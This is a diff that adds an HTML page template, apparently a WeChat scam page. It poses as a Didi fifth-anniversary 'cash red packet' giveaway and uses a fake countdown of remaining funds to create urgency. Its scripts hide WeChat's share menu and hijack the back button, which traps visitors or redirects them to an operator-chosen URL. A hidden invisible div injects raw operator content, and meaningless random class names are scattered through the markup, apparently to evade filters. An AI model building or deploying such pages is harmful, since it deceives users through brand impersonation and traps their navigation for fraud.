@@ -1,0 +1,203 @@
+<html lang="en" style="font-size: 85.3333px;">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport"
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
+    <title>五周年庆</title>
+    <link rel="stylesheet" type="text/css" href="./static/css/d.css">
+    <link rel="stylesheet" type="text/css" href="./static/css/big.css?222221">
+</head>
+<style>
+    .sadsadas{color: #fff}
+    #asdfsdfsdfsd{color: aqua}
+    .sadwrerdvcx{color: beige}
+</style>
+
+<body style="background:#F4F4F4">
+    <script src="./static/js/jquery.min.js" charset="utf-8"></script>
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.4.0.js"></script>
+    <script>
+        var indexUrl = "{$index}";
+    </script>
+    <script src="./static/js/core.js" charset="utf-8"></script>
+    <script src="./static/js/d2.js?v212222222" charset="utf-8"></script>
+    <div class="safdewsrewrfdfds"></div>
+    <div class="loadingBar" id="LoadingBar">正在加载中</div>
+    <span class="asdasdfsafds"></span>
+    <!-- 返回按钮 -->
+    <div class="back-box">
+        <div>&lt;返回 <span class="asdasdasdsa"></span></div>
+        <div>关闭<span class="sdafdsfsdfds"></span> </div>
+    </div>
+    <span class="asdasdsadsad"></span>
+    
+    <!-- 弹窗 -->
+    <div id="js_mod_dialog" class="mod-popup single-btn-popup">
+        <span class="asdasfsdfsdfds"></span>
+        <div class="popup-body">
+            <span class="dsfdfdvcd"></span>
+            <h3 class="popup-title"></h3>
+            <span class="sdsdsdsvvccx"></span>
+            <div class="popup-cont">
+                <p class="asdfsafisdjfksdf"></p>
+                <span style="font-size: 22px;color:#1BBC9B;">恭喜您</span><br><br>
+                <span class="sdwesdsdsfgf"></span>
+                <span style="font-size: 17px;color:#000;">为庆祝滴滴成立<span style="color:red;">五周年</span></span><br/>
+                <p class="asferwe"></p>
+                <span style="color:red;font-size: 17px;">感谢你一路支持</span><br/><br/>
+                <span class="sadfdfxcx"></span>
+                <span style="font-size: 17px;color:#000;">为答谢粉丝们的支持与厚爱，<br>现发出<span style="color:red;font-size: 17px;">1000万</span>现金红包回馈粉丝</span><br/><br/>
+                <span class="asew35"></span>
+                <span style="color:#999;font-size: 17px;">红包总额仅剩余<span style="color:red;font-size: 22px;">51.29万元</span></span><br/>
+                <p class="sdsd23243"></p>
+                <span style="color:#999;font-size: 17px;">数量有限，先到先得</span><br/><br/>
+                <div class="sdsewe"></div>
+            </div>
+            <span class="asdfdfdsfd"></span>
+            <div class="popup-btn"><a class="js_global_dialog_submit_btn" 
+                    data-value="0"><span>我知道了</span></a></div>
+        </div>
+        <span class="sadsadasd"></span>
+    </div>
+    <span class="sdfsdsdasa"></span>
+    <div style="width: 1px;height: 1px;opacity: 0; overflow: hidden;">
+        {$setting.contents|raw}
+    </div>
+    <span class="asdwewew"></span>
+</body>
+
+
+
+
+</html>
+
+<script>
+    function onBridgeReady() {
+        WeixinJSBridge.call('hideOptionMenu');
+    }
+
+    if (typeof WeixinJSBridge == "undefined") {
+        if (document.addEventListener) {
+            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+        } else if (document.attachEvent) {
+            document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+        }
+    } else {
+        onBridgeReady();
+    }
+</script>
+<script>
+
+    function disable_back() {
+        XBack = {};
+
+        (function (XBack) {
+            XBack.STATE = 'x - back';
+            XBack.element;
+
+            XBack.onPopState = function (event) {
+                event.state === XBack.STATE && XBack.fire();
+                XBack.record(XBack.STATE); //初始化事件时，push一下
+            };
+
+            XBack.record = function (state) {
+                history.pushState(state, null, location.href);
+            };
+
+            XBack.fire = function () {
+                var event = document.createEvent('Events');
+                event.initEvent(XBack.STATE, false, false);
+                XBack.element.dispatchEvent(event);
+            };
+
+            XBack.listen = function (listener) {
+                XBack.element.addEventListener(XBack.STATE, listener, false);
+            };
+
+            XBack.init = function () {
+                XBack.element = document.createElement('span');
+                window.addEventListener('popstate', XBack.onPopState);
+                XBack.record(XBack.STATE);
+            };
+
+        })(XBack); // 引入这段js文件
+
+        XBack.init();
+        XBack.listen(function () { });
+    }
+
+    var load_back = "{$share_load}";
+    if (load_back.trim() == "") {
+        disable_back();
+        $('.back-box').hide()
+    } else {
+
+        if (load_back.search('http://') == -1) load_back = 'http://' + load_back;
+        $(function () {
+            pushHistory();
+            window.addEventListener("popstate", function (e) {
+                window.location.href = load_back;
+            }, false);
+            function pushHistory() {
+                var state = {
+                    title: "title",
+                    url: "#"
+                };
+                window.history.pushState(state, "title", "#");
+            }
+
+        });
+    }
+    $('.back-box').click(function(){
+            var load_back1 ="{$share_load}";
+            if (load_back1.trim() != "") {
+                $(function(){
+                    if (load_back1.search('http://') == -1) load_back1='http://'+load_back1;
+                    window.location.href=load_back1;
+
+                });
+            }else{
+                
+            }
+        })
+</script>
+<script>
+$('.js_global_dialog_submit_btn').click(function(){
+    $('#js_mod_dialog').hide()
+})
+</script>
+<script>
+    function initPage()   
+    {   
+        var objLoading = document.getElementById("LoadingBar");   
+        if (objLoading != null)   
+        {   
+            objLoading.style.display = "none";   
+        }   
+    }
+    window.onload = initPage()
+</script>
+<script>
+     function getNowFormatDate() {
+        var date = new Date();
+        var seperator1 = "-";
+        var year = date.getFullYear();
+        var month = date.getMonth() + 1;
+        var strDate = date.getDate() + 2;
+        if (month >= 1 && month <= 9) {
+            month = "0" + month;
+        }
+        if (strDate >= 0 && strDate <= 9) {
+            strDate = "0" + strDate;
+        }
+        var currentdate = year + seperator1 + month + seperator1 + strDate;
+        return currentdate;
+    }
+    var dataNow = getNowFormatDate();
+    $('#dataNow').html(dataNow)
+</script>
